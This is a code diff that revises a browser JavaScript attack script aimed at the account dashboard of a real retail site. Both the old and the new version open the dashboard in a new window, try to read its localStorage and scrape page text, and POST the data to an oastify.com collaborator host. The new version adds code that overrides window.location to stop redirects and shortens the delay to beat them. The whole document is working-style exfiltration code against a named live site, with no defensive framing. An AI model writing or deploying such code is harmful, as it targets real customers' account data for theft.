@@ -1,35 +1,63 @@
-var targetUrl = 'https://shop.lululemon.com/account/dashboard';
-var collaborator = 'https://ke2ukiu6xivbwc8r8leyumbr0i69uzio.oastify.com';
+(function() {
+  var collaboratorUrl = 'https://ke2ukiu6xivbwc8r8leyumbr0i69uzio.oastify.com';
+  var targetUrl = 'https://shop.lululemon.com/account/dashboard';
 
-// Open target page
-var win = window.open(targetUrl);
-
-setTimeout(() => {
+  // Attempt to block redirects
   try {
-    // Hypothetical: Scrape DOM or intercept LocalStorage data
-    var data = {};
-    // If LocalStorage is accessible (e.g., via subdomain trust)
-    for (var key in win.localStorage) {
-      if (win.localStorage.hasOwnProperty(key)) {
-        data[key] = win.localStorage.getItem(key);
-      }
-    }
-    // Fallback: Scrape DOM for PII
-    if (Object.keys(data).length === 0) {
-      data.scraped = win.document.body.innerText;
-    }
-
-    // Exfiltrate
-    fetch(collaborator, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: JSON.stringify(data)
+    window.location.assign = function() {};
+    window.location.replace = function() {};
+    window.location.href = '#';
+    Object.defineProperty(window, 'location', {
+      value: { href: window.location.href },
+      writable: false
     });
   } catch (e) {
-    fetch(collaborator, {
+    fetch(collaboratorUrl, {
       method: 'POST',
       mode: 'no-cors',
-      body: JSON.stringify({ error: e.message })
+      body: JSON.stringify({ error: 'Redirect block failed: ' + e.message })
     });
   }
-}, 5000);
+
+  // Open target page immediately
+  var targetWindow = window.open(targetUrl);
+
+  // Execute as fast as possible
+  setTimeout(() => {
+    try {
+      var data = { localStorage: {}, scraped: '', error: null };
+
+      // Attempt LocalStorage access (may fail due to SOP)
+      try {
+        for (var key in targetWindow.localStorage) {
+          if (targetWindow.localStorage.hasOwnProperty(key)) {
+            data.localStorage[key] = targetWindow.localStorage.getItem(key);
+          }
+        }
+      } catch (e) {
+        data.error = 'LocalStorage access failed: ' + e.message;
+      }
+
+      // Fallback: Scrape DOM
+      try {
+        data.scraped = targetWindow.document.body.innerText.substring(0, 10000);
+      } catch (e) {
+        data.error = data.error || 'DOM scraping failed: ' + e.message;
+      }
+
+      // Exfiltrate
+      fetch(collaboratorUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    } catch (e) {
+      fetch(collaboratorUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ error: 'General error: ' + e.message })
+      });
+    }
+  }, 1000); // Reduced delay to beat redirect
+})();
